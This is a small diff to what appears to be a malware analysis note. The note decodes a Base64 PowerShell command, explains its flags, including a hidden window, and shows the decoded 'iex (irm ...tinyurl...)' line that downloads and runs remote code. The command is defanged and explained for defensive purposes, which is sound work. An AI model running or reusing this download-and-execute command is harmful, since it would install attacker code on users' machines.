@@ -5,7 +5,7 @@ powershell -enc aAA7AGkAZQB4ACgAaQByAG0AIABoAHQAdABwAHMAOgAvAC8AdABpAG4AeQB1AHIA
 **-enc:** Decode in Base64  
 **-w h:** Don't show window  
 
-**Decoded string(added []):** iex (irm https://tinyurl[.]com/35nprk4j)  
+## Decoded string(added []): iex (irm https://tinyurl[.]com/35nprk4j)  
 
 **iex:** This is an alias for Invoke-Expression, which executes a command passed as a string  
 **irm:** This is an alias for Invoke-RestMethod, which retrieves data from a web resource
